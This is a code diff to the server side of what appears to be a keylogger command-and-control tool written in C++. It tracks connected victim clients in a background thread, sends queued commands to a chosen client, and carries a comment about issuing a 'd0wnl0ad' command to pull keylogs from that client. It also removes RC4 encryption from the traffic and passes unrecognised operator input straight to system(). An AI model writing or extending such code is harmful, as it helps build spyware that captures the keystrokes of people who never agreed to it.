@@ -36,12 +36,26 @@ void onClientConnect(MySocket::Socket serverSocket)
         string clientIP = inet_ntoa(clientData.second.sin_addr);
         clients[clientData.first] = clientIP;
         // cout << "Connected to " << clientIP << " . Client_Socket: " << clientData.first << endl;
+        // continuously check for disconnected clients
+    }
+}
+
+void checkConn()
+{
+    while (1)
+    {
+        checkConnection(clients);
+        std::this_thread::sleep_for(std::chrono::milliseconds(3000));
     }
 }
 
 int main()
 {
     cout << "Starting Server, Please Wait ..." << endl;
+
+    thread handleCheck(checkConn);
+    handleCheck.detach();
+
     while (1)
     {
         MySocket::Socket socket(23534);
@@ -127,27 +141,44 @@ int main()
                          << endl;
                 }
             }
+            // Send d0wnl0ad to download keylog from client
             else if (cmdName == "/send")
             {
-                string toSend("");
+                if (clients.find(currentClient) == clients.end())
+                {
+                    cout << "Client you are sending is already disconnected ... " << endl;
+                    terminalPrompt = "> ";
+                }
+                else
+                {
+                    string toSend("");
+                    int cmdSize = Cmds.size();
+                    for (int i = 0; i < cmdSize; i++)
+                    {
+                        // cout << Cmds.back() << endl;
+                        toSend += Cmds.back() + "$";
+                        Cmds.pop_back();
+                    }
+
+                    cout << "Sending: " << toSend << endl;
+
+                    socket.Send(currentClient, toSend);
+                }
+            }
+            else
+            {
+                string sysCmd = cmdName;
+                size_t pos = cmdName.find("/");
+                cmdName = cmdName.substr(pos + 1);
+
                 int cmdSize = Cmds.size();
                 for (int i = 0; i < cmdSize; i++)
                 {
                     // cout << Cmds.back() << endl;
-                    toSend += Cmds.back() + "_";
+                    sysCmd += " " + Cmds.back();
                     Cmds.pop_back();
                 }
-
-                cout << "Sending: " << toSend << endl;
-
-                RC4 r(INET_KEY);
-                toSend = r.encrypt(toSend);
-
-                int res = send(currentClient, toSend.c_str(), toSend.size(), 0);
-            }
-            else
-            {
-                displayHelp();
+                system(sysCmd.c_str());
             }
         }
         socket.Close();
